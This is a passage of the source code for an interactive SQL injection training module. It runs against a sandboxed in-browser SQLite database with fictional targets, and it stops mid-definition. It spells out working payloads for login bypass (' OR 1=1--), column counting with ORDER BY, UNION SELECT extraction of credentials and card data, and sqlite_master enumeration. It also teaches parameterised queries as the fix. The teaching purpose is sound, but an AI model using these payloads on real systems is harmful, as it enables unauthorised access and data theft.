"use client";

/* Module 5 - Injection (DEPTH STANDARD v3).
 *
 * Built to the standard from UAT, then deepened again from re-test: hover/tap
 * glossary, de-biased checks with near-miss distractors, a taught lesson with a
 * recap, a SEVEN-stage capture (probe -> bypass -> count columns -> extract
 * staff -> map the schema -> lift the card data -> crack the vault), a hint
 * ladder that can drop a fill-in-the-blanks STRUCTURE into the box, and FOUR
 * scenario drills on fresh clients (the last one combines a login bypass and a
 * search UNION on one target - two surfaces, one database). All injection runs
 * for real against wasm SQLite, zero egress. */

import { useEffect, useState, type CSSProperties } from "react";
import Engagement, { type ModuleDef, type GlossaryEntry, C, MONO, DISP, Btn, withGlossary, shuffle, AnswerReveal } from "./Engagement";
import ExplainQuiz from "./ExplainQuiz";
import {
  bootNorthwindRange, bootScenario,
  type NorthwindRange, type ScenarioRange, type ScenarioSpec, type RangeRunResult,
} from "./engine";

/* ───────────────────────── glossary ───────────────────────── */

const GLOSSARY: GlossaryEntry[] = [
  { term: "database", definition: "A giant, organised store of information - picture a stack of spreadsheets the website reads from and writes to.", example: "When you search a shop for 'trainers', the site asks its database - a huge set of linked spreadsheets holding every product, order and customer - and shows you the matching rows." },
  { term: "query", definition: "A question the app asks the database, written in SQL - like 'give me the user whose email is this'.", example: "A login runs a query like 'find the user whose email is this and whose password is that' - the app's question put to the database in SQL." },
  { term: "SQL", definition: "Structured Query Language - the language websites use to talk to their database.", example: "SQL is the language almost every website uses to talk to its data: 'SELECT name FROM users' simply means 'give me the names from the users table'." },
  { term: "injection", definition: "Sneaking your own commands into an app's input so they run as code instead of being treated as plain text.", example: "A search box expects a word, but you type a word plus your own SQL command; if the site drops it straight into its query, your command runs - that is injection." },
  { term: "payload", definition: "The crafted input you send to pull off an attack - your 'ammo'.", example: "The payload is the exact text you paste to pull off the attack, like ' OR '1'='1 - your ammo, crafted to break the query." },
  { term: "parameterised query", definition: "The safe way to talk to a database: the query has blanks, and your input is slotted in as pure data that can never run as commands.", example: "A parameterised query is like a form with labelled slots: whatever you type drops into the 'email' slot as plain data and can never be read as a command - the fix that kills injection." },
  { term: "UNION", definition: "A SQL move that staples a second query's results onto the first - letting you pull data from a whole different table.", example: "A UNION lets your injected query staple on a second request, so a product search can be tricked into also returning every row from the passwords table under the trainers." },
  { term: "column", definition: "One field in a table - like a single column in a spreadsheet, e.g. 'email'.", example: "In a 'users' table, email is one column and password_hash is another - each column is one kind of fact stored about every row." },
  { term: "table", definition: "A set of same-shaped rows in a database - like one sheet in a spreadsheet, e.g. the 'users' table.", example: "A shop's database might have a 'products' table, an 'orders' table and a 'users' table - each table is one spreadsheet of same-shaped rows." },
  { term: "schema", definition: "The blueprint of a database: the list of its tables and what columns each one has.", example: "The schema is the database's map: it tells you there's a 'users' table with columns email and password_hash - exactly what you need before you can lift anything from it." },
  { term: "hash", definition: "A scrambled fingerprint of a password. One-way by design: easy to make, meant to be impossible to reverse.", example: "Sites store your password as a hash like '5f4dcc3b...' instead of the real word; you can turn a password into that fingerprint, but you can't turn the fingerprint back into the password." },
  { term: "authentication", definition: "Proving you are who you say you are - usually with a password. The front door of an app.", example: "Typing your password to log in is authentication - the site checking you really are who you claim before it lets you in." },
  { term: "enumerate", definition: "To list things out one by one - here, discovering what tables and columns a database has.", example: "By probing the database table by table and column by column, you enumerate its whole layout - building the list of what's inside one name at a time." },
  { term: "syntax error", definition: "The database complaining that your query is written wrong - often a clue that it's taking your input literally.", example: "Type a lone quote ' into a login box and the page throws a database syntax error - that error is a gift, because it proves your input is reaching the query as code." },
];
const G = (text: string, keyPrefix: string) => withGlossary(text, GLOSSARY, new Set<string>(), keyPrefix);

/* ───────────────────────── shared surface bits ───────────────────────── */

const inp: React.CSSProperties = { width: "100%", padding: "10px 12px", borderRadius: 8, background: C.carbon, color: C.ink, border: `1px solid ${C.line}`, fontFamily: MONO, fontSize: 13.5 };
const lab: React.CSSProperties = { display: "block", fontFamily: MONO, fontSize: 11, color: C.mute, margin: "0 0 5px", letterSpacing: ".08em" };
function dot(c: string): React.CSSProperties { return { width: 9, height: 9, borderRadius: "50%", background: c, display: "inline-block" }; }

function WinBar({ host }: { host: string }) {
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "11px 16px", borderBottom: `1px solid ${C.lineSoft}`, background: C.raise }}>
      <i style={dot(C.red)} /><i style={dot(C.amber)} /><i style={dot(C.green)} />
      <span style={{ fontFamily: MONO, fontSize: 11.5, color: C.soft, marginLeft: 6 }}>{host}</span>
    </div>
  );
}

function ResultView({ r }: { r: RangeRunResult }) {
  return (
    <div style={{ marginTop: 14, background: C.carbon, border: `1px solid ${r.error ? C.red : C.line}`, borderRadius: 10, padding: "12px 14px" }}>
      <div style={{ fontFamily: MONO, fontSize: 10, letterSpacing: ".12em", color: C.mute, marginBottom: 6 }}>QUERY THAT RAN</div>
      <pre style={{ margin: 0, fontFamily: MONO, fontSize: 11.5, color: "#8fa0c8", whiteSpace: "pre-wrap", lineHeight: 1.6 }}>{r.sql}</pre>
      {r.error ? (
        <div style={{ marginTop: 9, fontFamily: MONO, fontSize: 12.5, color: C.red }}>⚠ SQL error · {r.error}</div>
      ) : r.rows.length === 0 ? (
        <div style={{ marginTop: 9, fontFamily: MONO, fontSize: 12.5, color: C.mute }}>0 rows returned</div>
      ) : (
        <div style={{ marginTop: 10, overflowX: "auto" }}>
          <table style={{ borderCollapse: "collapse", fontFamily: MONO, fontSize: 12 }}>
            <thead><tr>{r.columns.map((c, i) => <th key={i} style={{ textAlign: "left", padding: "4px 12px 6px 0", color: C.indigo2, borderBottom: `1px solid ${C.lineSoft}` }}>{c}</th>)}</tr></thead>
            <tbody>
              {r.rows.map((row, i) => (
                <tr key={i}>{row.map((cell, j) => <td key={j} style={{ padding: "4px 12px 4px 0", color: String(cell).startsWith("flag{") ? C.green : C.soft, whiteSpace: "nowrap" }}>{String(cell)}</td>)}</tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

// Each payload piece explains, in plain English, what it does - so a learner
// building an injection knows why the apostrophe, the comment (--), OR 1=1 etc.
// go in, instead of tapping symbols they don't understand.
function tokenHelp(raw: string): string {
  const k = raw.trim();
  if (k === "'") return "closes the text, so the rest runs as commands";
  if (k === "--") return "comment: ignores the rest of the line";
  if (k === "OR 1=1") return "a test that is always true, so it lets you in";
  if (k === "UNION SELECT") return "staple on a second query to pull other data";
  if (k === ",") return "separates the columns you ask for";
  if (k === "NULL") return "empty filler, to match the column count";
  if (k.startsWith("ORDER BY")) return "sort by that column number (errors if there is none)";
  if (k.startsWith("FROM ")) return `read from the ${k.slice(5)} table`;
  return "a column to read out";
}
function Palette({ tokens, onInsert }: { tokens: string[]; onInsert: (t: string) => void }) {
  return (
    <div style={{ marginTop: 10 }}>
      <div style={{ fontFamily: MONO, fontSize: 10, letterSpacing: ".1em", color: C.mute, marginBottom: 7 }}>PAYLOAD PIECES · tap to add (each does one job)</div>
      <div style={{ display: "flex", gap: 7, flexWrap: "wrap" }}>
        {tokens.map((t) => (
          <button key={t} onClick={() => onInsert(t)} className="co-opt" style={{ display: "inline-flex", flexDirection: "column", alignItems: "flex-start", gap: 3, padding: "7px 11px", borderRadius: 8, border: `1px solid ${C.line}`, background: C.panel, cursor: "pointer", textAlign: "left", maxWidth: 200 }}>
            <span style={{ fontFamily: MONO, fontSize: 13, color: C.indigo2, fontWeight: 700, whiteSpace: "pre" }}>{t.trim()}</span>
            <span style={{ fontSize: 10.5, color: C.mute, lineHeight: 1.3 }}>{tokenHelp(t)}</span>
          </button>
        ))}
      </div>
    </div>
  );
}

// Progressive help the owner signed off on: have a go -> stuck? a hint -> still
// stuck? another hint -> the structure scaffold -> last resort, the full answer.
// The actions are bright, standout pill-buttons (no dull grey links that look
// dead), and revealing the answer gives a clear confirmation - so even a short
// stage-1 answer visibly "lands" in the box.
function HintLadder({ hints, onSkeleton, onReveal }: { hints: string[]; onSkeleton: () => void; onReveal: () => void }) {
  const [shown, setShown] = useState(0);
  const [structured, setStructured] = useState(false);
  const [revealed, setRevealed] = useState(false);
  const pill = (fg: string): CSSProperties => ({ display: "inline-flex", alignItems: "center", gap: 7, padding: "9px 15px", borderRadius: 9, border: `1px solid ${fg}`, background: `${fg}22`, color: fg, fontFamily: MONO, fontSize: 12.5, fontWeight: 700, letterSpacing: ".02em", cursor: "pointer" });
  return (
    <div style={{ marginTop: 14 }}>
      {Array.from({ length: shown }).map((_, i) => (
        <div key={i} style={{ marginBottom: 7, padding: "10px 13px", borderLeft: `3px solid ${C.indigo}`, borderRadius: "0 8px 8px 0", background: "rgba(139,123,255,0.08)", fontSize: 13.5, color: "#D9E0EE", lineHeight: 1.55 }}><b style={{ color: C.indigo2, fontFamily: MONO, fontSize: 11 }}>HINT {i + 1} · </b>{hints[i]}</div>
      ))}
      {shown >= hints.length && (
        <div style={{ marginBottom: 7, padding: "10px 13px", borderLeft: `3px solid ${C.cyan}`, borderRadius: "0 8px 8px 0", background: "rgba(95,230,255,0.08)", fontSize: 13.5, color: "#D9E0EE", lineHeight: 1.55 }}>
          <b style={{ color: C.cyan, fontFamily: MONO, fontSize: 11 }}>SCAFFOLD · </b>Stuck on how to type it? Drop the structure into the box and fill in the blanks (the column and table names).
        </div>
      )}
      <div style={{ display: "flex", gap: 10, alignItems: "center", flexWrap: "wrap", marginTop: 4 }}>
        {shown < hints.length && <button className="co-btn" onClick={() => setShown(shown + 1)} style={pill(C.indigo2)}>{shown === 0 ? "Have a go. Stuck? Get a hint →" : "Still stuck? Another hint →"}</button>}
        {shown >= hints.length && !structured && <button className="co-btn" onClick={() => { onSkeleton(); setStructured(true); }} style={pill(C.cyan)}>Show me the structure</button>}
        {shown >= hints.length && !revealed && <button className="co-btn" onClick={() => { onReveal(); setRevealed(true); }} style={pill(C.amber)}>Still really struggling? Reveal the answer</button>}
      </div>
      {revealed && (
        <div className="co-anim co-pop" style={{ marginTop: 11, padding: "10px 13px", borderRadius: 9, border: `1px solid ${C.amber}66`, background: "rgba(232,163,61,0.10)", fontSize: 13.5, color: C.ink, lineHeight: 1.55 }}>
          <b style={{ color: C.amber }}>✓ Answer dropped into the box.</b> Read it so you can see why it works, then press RUN.
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── lesson lab ───────────────────────── */

function InputBecomesCodeLab({ onDone }: { onDone: () => void }) {
  const [val, setVal] = useState("");
  const broke = val.includes("'");
  useEffect(() => { if (broke) onDone(); }, [broke, onDone]);
  const before = `SELECT * FROM users WHERE email = '`;
  return (
    <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 12, padding: "15px 16px" }}>
      <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".1em", color: C.indigo, fontWeight: 700, marginBottom: 9 }}>▶ TRY IT · watch your input land inside the query</div>
      <label style={lab}>type an email… then try typing a single quote &apos;</label>
      <input style={inp} value={val} onChange={(e) => setVal(e.target.value)} placeholder="you@example.com" />
      <pre style={{ marginTop: 12, marginBottom: 0, fontFamily: MONO, fontSize: 12.5, whiteSpace: "pre-wrap", lineHeight: 1.7, color: "#8fa0c8" }}>
        {before}
        <span style={{ color: broke ? C.red : C.amber, background: broke ? "rgba(242,109,114,.12)" : "rgba(232,163,61,.12)", borderRadius: 3, padding: "0 2px" }}>{val || " "}</span>
        {`' AND pass = '…'`}
      </pre>
      {broke && (
        <div style={{ marginTop: 11, padding: "10px 13px", borderRadius: 9, background: "rgba(242,109,114,.08)", border: `1px solid ${C.red}55`, fontSize: 13, color: C.ink, lineHeight: 1.5 }}>
          See it? Your <b style={{ fontFamily: MONO }}>&apos;</b> closed the string early. Everything after it is now read as <b>commands, not data</b>. That&rsquo;s the whole of injection - and you just did it.
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── defend lab ───────────────────────── */

function PickSafeQueryLab({ onDone }: { onDone: () => void }) {
  const [opts] = useState(() => shuffle([
    { code: `Build the command by gluing the user's input straight into the text`, ok: false, why: "This is the bug itself - gluing input into the query string. Exactly what you just exploited." },
    { code: `Build the command the same way, but first strip quote marks out of the input`, ok: false, why: "Stripping quotes is a blocklist - bypassable, and it still builds the query by hand. Not the real fix." },
    { code: `Send the command and the user's input to the database as separate things`, ok: true, why: "Parameterised: a placeholder (?) marks the spot and the value is sent separately, so the database treats it as data - never as SQL. This is the fix." },
    { code: `Check the input looks like an email, then glue it into the command text`, ok: false, why: "Validating the format still glues the value into the string by hand - other fields and valid-looking payloads can still break out. Parameterise instead." },
  ]));
  return (
    <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 12, padding: "15px 16px" }}>
      <div style={{ fontFamily: MONO, fontSize: 10.5, letterSpacing: ".1em", color: C.indigo, fontWeight: 700, marginBottom: 10 }}>▶ APPLY THE FIX · which login query is safe?</div>
      <AnswerReveal
        options={opts.map((o) => ({ text: o.code, correct: o.ok, reason: o.why }))}
        onAnswered={() => onDone()}
        doShuffle={false}
      />
    </div>
  );
}

/* ───────────────────────── the 5-stage capture ───────────────────────── */

type Stage = {
  key: string; title: string; surface: "login" | "search"; goal: string;
  tokens: string[]; hints: string[];
  /** The structural scaffold dropped into the box on "show the structure" -
   *  blanks for the learner to fill, so they see where the quotes/commas go. */
  skeleton: string;
  reveal: string;
  done: (r: RangeRunResult & { authed?: boolean }, range: NorthwindRange, input: string) => boolean;
  /** Task-variety (UAT): an optional "explain why it worked" question shown
   *  after the stage is cleared, before you can advance. Breaks the type-run-
   *  next rhythm with a comprehension beat. Options shuffle; each has feedback. */
  explain?: { q: string; options: { text: string; correct?: boolean; feedback: string }[] };
};

const STAGES: Stage[] = [
  {
    key: "probe", title: "Probe", surface: "login",
    goal: "Confirm the login is injectable. Make it error by breaking the query - put a single quote in the email and log in. A syntax error means it's taking your input literally.",
    tokens: ["'"],
    hints: ["A valid query won't error. Feed it something that breaks the SQL syntax.", "Put a single quote ' in the email field and submit. The extra quote makes the query invalid and it throws."],
    skeleton: "'", reveal: "'", done: (r) => r.error != null,
  },
  {
    key: "bypass", title: "Bypass", surface: "login",
    goal: "Log in with no password. Close the string, add an always-true condition, and comment out the password check.",
    tokens: ["'", " OR 1=1", "--"],
    hints: ["Start by closing the string with a quote, like the probe.", "After the quote, add a condition that's always true: OR 1=1", "Finish with -- to comment out the rest of the line. Put it in the EMAIL field; leave the password blank."],
    skeleton: "' OR ___ --", reveal: "' OR 1=1--", done: (r) => !!r.authed,
    explain: {
      q: "You got into the staff console with no password. On a real site, what else could this same injection flaw let an attacker do?",
      options: [
        { text: "Read or change almost any data the database holds - customer records, password hashes, card details - not just the login.", correct: true, feedback: "Right - that's why injection is so serious. The same flaw that skips a login can pull or alter whole tables, which is exactly what you do next." },
        { text: "Only bypass logins: injection can skip a password check but can't reach any other table.", feedback: "No - once your input is part of the query, it can reach far beyond the login, as the next stages show." },
        { text: "Only slow the site down, because the extra query just adds load to the server.", feedback: "It's not about load - injection reads and changes real data, not just performance." },
        { text: "Only affect your own account, since the query still runs as the user you logged in as.", feedback: "The injected query runs with the database's own access, not a single user's - it can reach everyone's data." },
      ],
    },
  },
  {
    key: "count", title: "Count the columns", surface: "search",
    goal: "Before you can UNION, you need to know how many columns the search returns. ORDER BY <n> sorts by the nth column - and errors if there is no nth column. Climb the number until it errors; the last one that works is your count. Get ORDER BY 3 to run clean.",
    tokens: ["'", " ORDER BY 1", " ORDER BY 2", " ORDER BY 3", " ORDER BY 4", "--"],
    hints: ["Try ' ORDER BY 1-- then 2, then 3, then 4... watch for the number that errors.", "' ORDER BY 4-- errors (there is no 4th column). ' ORDER BY 3-- works - so the search has 3 columns."],
    skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 3--",
    done: (_r, _range, input) => /order\s+by\s+3\b/i.test(input) && _r.error == null,
  },
  {
    key: "staff", title: "Extract staff", surface: "search",
    goal: "Now you know it's 3 columns. Use a UNION to pull the whole staff table (email, pass, role) out through the search.",
    tokens: ["'", " UNION SELECT ", "email", "pass", "role", ",", " FROM users", "--"],
    hints: ["Match the 3 columns you found: ' UNION SELECT (three things) FROM users--", "Pull the useful three: ' UNION SELECT email, pass, role FROM users--"],
    skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT email, pass, role FROM users--",
    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@northwind.range"))),
  },
  {
    key: "enumerate", title: "Map the schema", surface: "search",
    goal: "You don't know what else is in the database yet. Every SQLite database lists its own tables in a built-in table called sqlite_master - UNION it out to enumerate the schema and find what's hidden.",
    tokens: ["'", " UNION SELECT ", "name", "sql", "type", ",", " FROM sqlite_master", "--"],
    hints: ["Same UNION, 3 columns again - but this time SELECT from sqlite_master.", "Try: ' UNION SELECT name, sql, type FROM sqlite_master-- and read the table names that come back. Two of them you haven't touched yet."],
    skeleton: "' UNION SELECT ___, ___, ___ FROM sqlite_master --", reveal: "' UNION SELECT name, sql, type FROM sqlite_master--",
    done: (r) => r.rows.some((row) => row.some((c) => c === "secrets")),
    explain: {
      q: "That one query listed every table in the database. What is sqlite_master?",
      options: [
        { text: "A table SQLite keeps automatically in every database, listing all of its tables and how they're defined.", correct: true, feedback: "Right. It's the database describing itself, which is why one UNION against it maps the whole schema." },
        { text: "A hidden administrator account that SQLite creates to manage and lock down all the other tables.", feedback: "No - it isn't an account or a login. It's an ordinary (built-in) table full of schema information." },
        { text: "An encrypted master backup of the database that SQLite quietly keeps in case of corruption.", feedback: "No - it isn't a backup and isn't encrypted; it's a plain catalogue of the database's own structure." },
        { text: "A table the developer left behind by mistake, holding the database's master password.", feedback: "No - it's a standard SQLite feature, not a developer slip, and it holds schema definitions, not passwords." },
      ],
    },
  },
  {
    key: "cards", title: "Lift the card data", surface: "search",
    goal: "The schema showed an orders table - customer payment records, sitting in the same database. Pull it out through the search: customer names and the last 4 digits of their cards.",
    tokens: ["'", " UNION SELECT ", "customer", "card_last4", "NULL", ",", " FROM orders", "--"],
    hints: ["Same UNION, 3 columns. The table is called orders.", "orders has customer and card_last4. Pad the third column with NULL: ' UNION SELECT customer, card_last4, NULL FROM orders--"],
    skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT customer, card_last4, NULL FROM orders--",
    done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && /^\d{4}$/.test(c))),
  },
  {
    key: "vault", title: "Crack the vault", surface: "search",
    goal: "Last target: the secrets table the schema revealed. UNION it out the same way to capture the flag.",
    tokens: ["'", " UNION SELECT ", "label", "value", "NULL", ",", " FROM secrets", "--"],
    hints: ["Same trick, the secrets table. Still three columns.", "secrets has label and value. Pad the third with NULL: ' UNION SELECT label, value, NULL FROM secrets--"],
    skeleton: "' UNION SELECT ___, ___, ___ FROM secrets --", reveal: "' UNION SELECT label, value, NULL FROM secrets--",
    done: (r, range) => r.rows.some((row) => row.some((c) => c === range.vaultFlag)),
  },
];

function InjectionAct({ onCapture }: { onCapture: () => void }) {
  const [range, setRange] = useState<NorthwindRange | null>(null);
  const [bootErr, setBootErr] = useState("");
  const [si, setSi] = useState(0);
  const [email, setEmail] = useState("");
  const [pass, setPass] = useState("");
  const [term, setTerm] = useState("");
  const [res, setRes] = useState<(RangeRunResult & { authed?: boolean }) | null>(null);
  const [cleared, setCleared] = useState<boolean[]>(STAGES.map(() => false));
  const [explainOk, setExplainOk] = useState(false);

  useEffect(() => {
    let live = true;
    bootNorthwindRange().then((r) => live && setRange(r)).catch((e) => live && setBootErr((e as Error).message));
    return () => { live = false; };
  }, []);

  if (bootErr) return <div style={{ fontFamily: MONO, fontSize: 13, color: C.red }}>Range failed to boot: {bootErr}</div>;
  if (!range) return <div style={{ fontFamily: MONO, fontSize: 13, color: C.mute }}>// booting range target… (real SQLite, in-browser)</div>;

  const stage = STAGES[si];
  const field = stage.surface === "login" ? email : term;
  const setField = stage.surface === "login" ? setEmail : setTerm;

  function run() {
    if (!range) return;
    const r = stage.surface === "login" ? range.attemptLogin(email, pass) : range.search(term);
    setRes(r);
    if (stage.done(r, range, field)) { const n = [...cleared]; n[si] = true; setCleared(n); }
  }
  function advance() {
    setRes(null);
    setExplainOk(false);
    setEmail(""); setPass(""); setTerm(""); // fresh box for the next stage
    if (si + 1 < STAGES.length) setSi(si + 1);
    else onCapture();
  }

  const stageCleared = cleared[si];
  return (
    <div style={{ display: "grid", gap: 14 }}>
      <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
        {STAGES.map((s, i) => (
          <div key={s.key} style={{ display: "flex", alignItems: "center", gap: 7, padding: "5px 11px", borderRadius: 999, border: `1px solid ${i === si ? C.indigo : C.lineSoft}`, background: cleared[i] ? "rgba(85,217,140,.08)" : i === si ? "rgba(139,123,255,.07)" : "transparent" }}>
            <span style={{ fontFamily: MONO, fontSize: 10.5, color: cleared[i] ? C.green : i === si ? C.indigo2 : C.mute, fontWeight: 700 }}>{cleared[i] ? "✓" : i + 1}</span>
            <span style={{ fontFamily: MONO, fontSize: 11, color: i === si ? C.ink : C.mute }}>{s.title}</span>
          </div>
        ))}
      </div>

      <div style={{ fontSize: 14, color: C.soft, lineHeight: 1.55, padding: "11px 14px", borderRadius: 10, background: "rgba(139,123,255,0.05)", border: `1px solid ${C.line}` }}>
        <b style={{ color: C.indigo2, fontFamily: DISP }}>Stage {si + 1} · {stage.title}. </b>{G(stage.goal, `stage-${stage.key}`)}
      </div>

      <div style={{ background: C.panel, border: `1px solid ${C.line}`, borderRadius: 14, overflow: "hidden" }}>
        <WinBar host={stage.surface === "login" ? "portal.northwind.range · staff login" : "shop.northwind.range · product search"} />
        <div style={{ padding: 18 }}>
          {stage.surface === "login" ? (
            <>
              <div style={{ marginBottom: 12 }}><label style={lab}>email</label><input style={inp} value={email} onChange={(e) => setEmail(e.target.value)} placeholder="name@northwind.range" /></div>
              <div style={{ marginBottom: 14 }}><label style={lab}>password</label><input style={inp} value={pass} onChange={(e) => setPass(e.target.value)} placeholder="(leave blank - go around it)" /></div>
            </>
          ) : (
            <div style={{ marginBottom: 14 }}><label style={lab}>search products</label><input style={inp} value={term} onChange={(e) => setTerm(e.target.value)} placeholder="e.g. oil" /></div>
          )}
          <div style={{ marginTop: 14, fontSize: 12.5, color: C.soft, lineHeight: 1.55, padding: "10px 13px", borderRadius: 9, background: "rgba(95,230,255,0.05)", border: "1px solid rgba(95,230,255,0.28)" }}>
            <b style={{ color: C.cyan }}>How to do it: </b>tap the pieces below to drop them into the {stage.surface === "login" ? "email" : "search"} box, in order. Each piece does one job (shown under it).{stage.surface === "login" ? " Leave the password blank." : ""} When your line looks right, press RUN {stage.surface === "login" ? "LOGIN" : "SEARCH"}. Not sure where to start? Tap a hint under the button.
          </div>
          <Palette tokens={stage.tokens} onInsert={(t) => setField(field + t)} />
          <div style={{ display: "flex", gap: 12, alignItems: "center", flexWrap: "wrap", marginTop: 14 }}>
            <Btn tone="i" onClick={run}>{stage.surface === "login" ? "RUN LOGIN →" : "RUN SEARCH →"}</Btn>
            <button onClick={() => setField("")} style={{ background: "none", border: "none", color: C.soft, fontFamily: MONO, fontSize: 12, cursor: "pointer", textDecoration: "underline", textUnderlineOffset: 3 }}>clear</button>
          </div>
          {res && <ResultView r={res} />}
          {!stageCleared && <HintLadder key={stage.key} hints={stage.hints} onSkeleton={() => setField(stage.skeleton)} onReveal={() => setField(stage.reveal)} />}
        </div>
      </div>

      {stageCleared && (
        <div className="co-anim co-pop" style={{ display: "grid", gap: 12, padding: "13px 16px", borderRadius: 12, background: "rgba(85,217,140,.08)", border: `1px solid ${C.green}55` }}>
          <div style={{ display: "flex", alignItems: "center", gap: 14, flexWrap: "wrap" }}>
            <span style={{ fontFamily: MONO, fontSize: 12.5, color: C.green, fontWeight: 700 }}>✓ Stage {si + 1} cleared</span>
            {(!stage.explain || explainOk) && <Btn tone="g" onClick={advance} style={{ marginLeft: "auto" }}>{si + 1 < STAGES.length ? "Next stage →" : "Capture the engagement →"}</Btn>}
          </div>
          {stage.explain && <ExplainQuiz key={stage.key} q={stage.explain.q} options={stage.explain.options} onCorrect={() => setExplainOk(true)} />}
        </div>
      )}
    </div>
  );
}

/* ───────────────────────── consolidation drills ───────────────────────── */

type DrillStep = {
  surface: "login" | "search"; goal: string; palette: string[];
  hint: string; skeleton: string; reveal: string;
  done: (r: RangeRunResult & { authed?: boolean }, input: string) => boolean;
};
type DrillCfg = {
  client: string; brief: string; host: string;
  spec: ScenarioSpec; steps: DrillStep[]; success: string;
};

const DRILLS: DrillCfg[] = [
  {
    client: "Harborlight - children's charity",
    brief: "Harborlight's donor portal goes live Monday. They've asked Redoubt for a quick smoke test of the login first. No step-by-step this time - you've done this move on Northwind. Prove a stranger can't walk in without a password.",
    host: "give.harborlight.range · donor login",
    spec: {
      setup: `CREATE TABLE donors (id INTEGER PRIMARY KEY, email TEXT, pass TEXT, role TEXT);
              INSERT INTO donors (email,pass,role) VALUES
                ('t.ellis@harborlight.range','G1ving!24','admin'),
                ('p.rao@harborlight.range','welcome1','staff');`,
      login: { table: "donors", select: "id, email, role", emailCol: "email", passCol: "pass", adminRole: "admin", roleIdx: 2 },
    },
    steps: [
      {
        surface: "login", goal: "Log into the donor portal with no valid password.",
        palette: ["'", " OR 1=1", "--"],
        hint: "Same front-door move as Northwind: close the string, force it true, comment out the rest. Email field; password blank.",
        skeleton: "' OR ___ --", reveal: "' OR 1=1--",
        done: (r) => !!r.authed,
      },
    ],
    success: "Signed in with no password - Harborlight's login trusts user input exactly like Northwind's did. Finding logged for them.",
  },
  {
    client: "Meridian Library",
    brief: "Meridian Library's public catalogue search sits on the same database as its member records. The library thinks the search box is harmless because 'it only searches books'. Show them a search box is a window onto the whole database - work it yourself, start to finish.",
    host: "catalogue.meridian.range · book search",
    spec: {
      setup: `CREATE TABLE books (id INTEGER PRIMARY KEY, title TEXT, author TEXT);
              INSERT INTO books (title,author) VALUES ('Coding for Teens','A. Price'),('The Web Book','R. Shah');
              CREATE TABLE members (id INTEGER PRIMARY KEY, name TEXT, cardno TEXT);
              INSERT INTO members (name,cardno) VALUES ('Jamie Fox','MEM-4471'),('Sara Khan','MEM-8820');`,
      search: { table: "books", select: "id, title, author", searchCol: "title" },
    },
    steps: [
      {
        surface: "search", goal: "First, work out how many columns the book search returns. Climb ORDER BY until it errors.",
        palette: ["'", " ORDER BY 1", " ORDER BY 2", " ORDER BY 3", " ORDER BY 4", "--"],
        hint: "' ORDER BY 4-- errors (no 4th column), ' ORDER BY 3-- works - so 3 columns.",
        skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 3--",
        done: (r, input) => /order\s+by\s+3\b/i.test(input) && r.error == null,
      },
      {
        surface: "search", goal: "Three columns. Now UNION the members table out to read a member's card number.",
        palette: ["'", " UNION SELECT ", "id", "name", "cardno", ",", " FROM members", "--"],
        hint: "Match the three columns, from the members table: id, name, cardno.",
        skeleton: "' UNION SELECT ___, ___, ___ FROM ___ --", reveal: "' UNION SELECT id, name, cardno FROM members--",
        done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.startsWith("MEM-"))),
      },
    ],
    success: "Member records pulled straight out of a 'book' search - counted the columns, then UNIONed them yourself. Finding logged.",
  },
  {
    client: "Fenwick Forums",
    brief: "Another field job, and the trickiest search shape yet. Fenwick's community forum has a thread search wired to the same database that stores member logins - but this search is a different shape. No walkthrough: work out the columns, then pull the members out.",
    host: "forum.fenwick.range · thread search",
    spec: {
      setup: `CREATE TABLE threads (id INTEGER PRIMARY KEY, title TEXT, author TEXT, posted TEXT);
              INSERT INTO threads (title,author,posted) VALUES ('Welcome','admin','2026-01-02'),('Forum rules','mod','2026-01-03');
              CREATE TABLE members (id INTEGER PRIMARY KEY, username TEXT, email TEXT, pass TEXT);
              INSERT INTO members (username,email,pass) VALUES
                ('h.patel','h.patel@fenwick.range','Spr1ng!99'),
                ('admin','admin@fenwick.range','F0rum_Adm1n');`,
      search: { table: "threads", select: "id, title, author, posted", searchCol: "title" },
    },
    steps: [
      {
        surface: "search", goal: "This search is wider than the last. Count its columns with ORDER BY before you UNION.",
        palette: ["'", " ORDER BY 3", " ORDER BY 4", " ORDER BY 5", "--"],
        hint: "' ORDER BY 5-- errors, ' ORDER BY 4-- works - so 4 columns.",
        skeleton: "' ORDER BY ___ --", reveal: "' ORDER BY 4--",
        done: (r, input) => /order\s+by\s+4\b/i.test(input) && r.error == null,
      },
      {
        surface: "search", goal: "Four columns. UNION the members table (id, username, email, pass).",
        palette: ["'", " UNION SELECT ", "id", "username", "email", "pass", ",", " FROM members", "--"],
        hint: "Match four, from members: id, username, email, pass.",
        skeleton: "' UNION SELECT ___, ___, ___, ___ FROM members --", reveal: "' UNION SELECT id, username, email, pass FROM members--",
        done: (r) => r.rows.some((row) => row.some((c) => typeof c === "string" && c.endsWith("@fenwick.range"))),
      },
    ],
    success: "Credentials pulled from a forum search - you counted a different column shape and adapted. That's the real skill. Finding logged.",
  },
  {
    client: "Tollgate Transit",
    brief: "The full field job to finish on. Tollgate's driver portal and its public parcel-tracking search sit on the same database - two injectable surfaces, one target. No walkthrough: walk in the front door first, then turn the tracking box into a driver-records leak. Everything you've practised, in one engagement.",
    host: "fleet.tollgate.range · driver portal",
    spec: {
      setup: `CREATE TABLE parcels (id INTEGER PRIMARY KEY, tracking TEXT, status TEXT);
              INSERT INTO parcels (tracking,status) VALUES ('TG-4471','in transit'),('TG-8820','delivered'),('TG-1093','at depot');
              CREATE TABLE drivers (id INTEGER PRIMARY KEY, email TEXT, pass TEXT, role TEXT);
              INSERT INTO drivers (email,pass,role) VALUES
                ('j.okafor@tollgate.range','R0ute66!','admin'),
                ('m.silva@tollgate.range','depot2026','driver');`,
